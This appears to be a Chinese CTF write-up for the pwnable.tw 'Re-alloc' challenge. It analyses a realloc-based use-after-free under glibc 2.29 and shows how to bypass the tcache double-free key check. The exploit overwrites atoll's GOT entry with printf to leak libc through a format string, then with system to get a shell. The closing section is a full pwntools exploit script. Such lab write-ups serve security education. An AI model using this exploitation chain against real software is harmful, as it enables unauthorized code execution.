## 检查

```
$ file re-alloc 
re-alloc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=14ee078dfdcc34a92545f829c718d7acb853945b, for GNU/Linux 3.2.0, not stripped
$ checksec re-alloc 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

Partial RELRO 意味着got表可改

```
$ strings libc-realloc.so | grep glibc
glibc 2.29
```

## 前置知识

### realloc函数

函数原型：

```c
void *realloc(void *ptr, size_t size);
```

在参数 ptr 、size 的各种取值情况下，等效于：

1. `ptr == 0`: malloc(size)
2. `ptr != 0 && size == 0`: free(ptr)
3. `ptr != 0 && size != old_size`: 释放之前的块再重新分配一个（保存数据）

### libc 2.29 对 tcache 新增的检查

```c
// glibc-2.29

/* This test succeeds on double free.  However, we don't 100%
    trust it (it also matches random payload data at a 1 in
    2^<size_t> chance), so verify it's not an unlikely
    coincidence before aborting.  */
if (__glibc_unlikely (e->key == tcache))
  {
    tcache_entry *tmp;
    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    for (tmp = tcache->entries[tc_idx];
    tmp;
    tmp = tmp->next)
      if (tmp == e)
  malloc_printerr ("free(): double free detected in tcache 2");
    /* If we get here, it was a coincidence.  We've wasted a
        few cycles, but don't abort.  */
  }
```

主要检查为，当一个chunk 被 free 到 tcache 中时，其 fd 的下一个字长不再空余，而是被置为 key ，存放保存 tcache 结构体的 chunk 的地址，这里会对`tcache`链表上的所有chunk进行对比，检测是否有重复。

绕过此检查的方法例如借助 UAF 等漏洞，将 tcache chunk 的 key 覆盖成不为存放 tcache 的内存地址即可。

## 配置题目运行环境

### glibc-all-in-one

https://github.com/matrix1001/glibc-all-in-one

```
$ git clone https://github.com/matrix1001/glibc-all-in-one.git
$ cd glibc-all-in-one/
$ chmod a+x build download extract
$ ./update_list
```

#### 查看list文件

```
$ cat list
$ cat old_list
```

#### 下载glibc

例如需要下载2.29-0ubuntu2_amd64

```
$ ./download_old 2.29-0ubuntu2_amd64
Getting 2.29-0ubuntu2_amd64
  -> Location: http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.29-0ubuntu2_amd64.deb
  -> Downloading libc binary package
  -> Extracting libc binary package
  -> Package saved to libs/2.29-0ubuntu2_amd64
  -> Location: http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-dbg_2.29-0ubuntu2_amd64.deb
  -> Downloading libc debug package
  -> Extracting libc debug package
  -> Package saved to libs/2.29-0ubuntu2_amd64/.debug
$ ls libs/2.29-0ubuntu2_amd64/
ld-2.29.so ... libc-2.29.so
```

### patchelf

```
$ sudo apt-get install patchelf
```

例如我们需要让 re-alloc 程序指向glibc-all-in-one中下载的libc-2.29

```
$ ldd re-alloc 
	linux-vdso.so.1 =>  (0x00007ffd3e7c7000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f48a66cb000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f48a6a95000)
$ patchelf  --set-rpath ~/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ re-alloc
$ patchelf --set-interpreter ~/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so re-alloc
$ ldd re-alloc 
	linux-vdso.so.1 =>  (0x00007ffdaff7e000)
	libc.so.6 => /home/ctfer/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc.so.6 (0x00007f2d342fd000)
	/home/ctfer/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/ld-2.29.so => /lib64/ld-linux-x86-64.so.2 (0x00007f2d342c4000)
```

## 分析

运行程序，是一个经典的菜单题

```
$ ./re-alloc 
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice:
```

### alloc

```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  __int64 v3; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v5; // [rsp+18h] [rbp-8h]

  printf("Index:", 0LL, 0LL, 0LL, 0LL);
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:", v2);
    size = read_long();
    if ( size <= 0x78 )
    {
      v5 = realloc(0LL, size);
      if ( v5 )
      {
        heap[v3] = v5;
        printf("Data:", size);
        v0 = (char *)heap[v3] + read_input(heap[v3], (unsigned int)size);
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (signed int)v0;
}
```

先读取index为long型，且值只能为0或1，size必须<=0x78，此处realloc就相当于malloc，然后读取data并在最后置零

### realloc

```c
int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc(heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:", size);
  return read_input((__int64)heap[v1], size);
}
```

编号，大小，数据，也很正常

### free

```c
int rfree()
{
  void **v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc(heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (signed int)v0;
}
```

同样使用realloc()函数进行free操作，并对指针清零

## 漏洞点

程序的 `rfree` 函数做了清空指针操作，看似杜绝了 UAF ，实际上在 `reallocate` 函数中调用 `realloc` 时，将其参数 size 置为 0，就等效于调用了 `free(ptr)`，且此时是没有清空 heap[2] 数组中的指针的。由此造成 UAF。

## 利用

由于程序的 got 表可写，故思路为：通过修改某参数为可控内容的内存指针的函数的 got 表项为 system 函数地址，传入 `"/bin/sh\x00"` 即可 get shell。

- 利用上述 UAF 漏洞，在两处 tcache 项上放置 atoll@got ，准备对其进行篡改

```python
# UAF 放置 atoll@got 至 tcache@0x20
alloc(0, 0x18, "AAA")
realloc(0, 0, "")
realloc(0, 0x18, p64(elf.got["atoll"])) # 由于 realloc 函数中 ptr 指向 tcache free chunk 时，其不会将该 chunk 从 tcache 中取出 [1]，故此处相当于 edit 功能 
alloc(1, 0x18, "BBB")

# 清零 heap[0]、heap[1]，以进行第二次放置
realloc(0, 0x28, "CCC")
free(0)
realloc(1, 0x28, "s"*0x10) # 因为[1]处原因，且 rfree 也由 realloc 实现，故此处需要将 fd 与 key 都覆盖为垃圾数据，确保 key 被修改以绕过 double free 检查
free(1)
```

- 第二次放置也一样

```python
# UAF 放置 atoll@got 至 tcache@0x40 
alloc(0, 0x38, "AAA") 
realloc(0, 0, "") 
realloc(0, 0x38, p64(elf.got["atoll"])) # 由于 realloc 函数中 ptr 指向 tcache free chunk 时，其不会将该 chunk 从 tcache 中取出，故此处相当于 edit 功能  alloc(1, 0x38, "BBB") 
 
# 清零 heap[0]、heap[1]，以进行接下来的利用 
realloc(0, 0x48, "CCC") 
free(0) 
realloc(1, 0x48, "s"*0x10) # 因为[1]处原因，且 rfree 也由 realloc 实现，故此处需要将 fd 与 key 都覆盖为垃圾数据，确保 key 被修改以绕过 double free 检查 
free(1) 
```

- 利用其中一个指向`atoll_got`的 chunk 更改`atoll_got`为`printf_plt`，这样在调用`atoll`时，就会调用`printf`从而构造出一个格式化字符串漏洞，利用这个漏洞可以 leak 出栈上的libc地址，这里选择 leak`__libc_start_main`
  补充：这里利用格式化字符串的常量为调试所得，例如%21$llx，例如0xeb（即235）因为获得的地址是<__libc_start_main+235>

- 利用另一个指向`atoll_got`的 chunk 将`atoll_got`再改成`system`，注意因为此时`atoll`是`printf`，所以在调用 alloc 时，需要输入的 Index 和 Size 不是直接输入数字，而是通过输入的 string 的长度来通过 printf 返回的值间接传给Index和Size。
- 最后再输入`/bin/sh\x00`调用`atoll`来执行`system("/bin/sh");`即可 get shell。

## exp

```python
#!/usr/bin/env python3

from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./re-alloc")
	libc = ELF("./libc-realloc.so")
	io = process(elf.path)
else:
	elf = ELF("./re-alloc")
	libc = ELF("./libc-realloc.so")
	io = remote("chall.pwnable.tw",10106)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

def alloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("1")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Data:")
    io.send(data)

def realloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    if size != 0:
        io.recvuntil("Data:")
        io.send(data)

def free(idx):
    io.recvuntil("Your choice: ")
    io.sendline("3")
    io.recvuntil("Index:")
    io.sendline(str(idx))

alloc(0, 0x18, "AAA")
realloc(0, 0, "")
realloc(0, 0x18, p64(elf.got["atoll"]))
alloc(1, 0x18, "BBB")

realloc(0, 0x28, "CCC")
free(0)
realloc(1, 0x28, "s"*0x10)
free(1)

alloc(0, 0x38, "AAA")
realloc(0, 0, "")
realloc(0, 0x38, p64(elf.got["atoll"]))
alloc(1, 0x38, "BBB")
 
realloc(0, 0x48, "CCC")
free(0)
realloc(1, 0x48, "s"*0x10)
free(1)

alloc(0, 0x38, p64(elf.plt["printf"]))
free("%21$llx")

libc_start_main_ret = int(r(12), 16)
libc_base = libc_start_main_ret - libc.symbols["__libc_start_main"] - 0xeb
system_addr = libc_base + libc.symbols["system"]
success("system address: " + hex(system_addr))
    
sla("Your choice: ", "1")
sla("Index:", "A\x00")
sa("Size:", "A"*15+"\x00")
sa("Data:", p64(system_addr))
free("/bin/sh\x00")

io.interactive()
```



参考：

- [Pwmable.tw Re-alloc](https://zhangyidong.top/2020/10/19/Pwnable_re-alloc/)
- [pwnable.tw Re-alloc](http://izayoi.cn/index.php/2020/07/04/pwnable-tw-re-alloc/)
- [pwnable.tw re-alloc](https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/#get-shell)
- [pwnable.tw re-alloc_revenge](https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/)

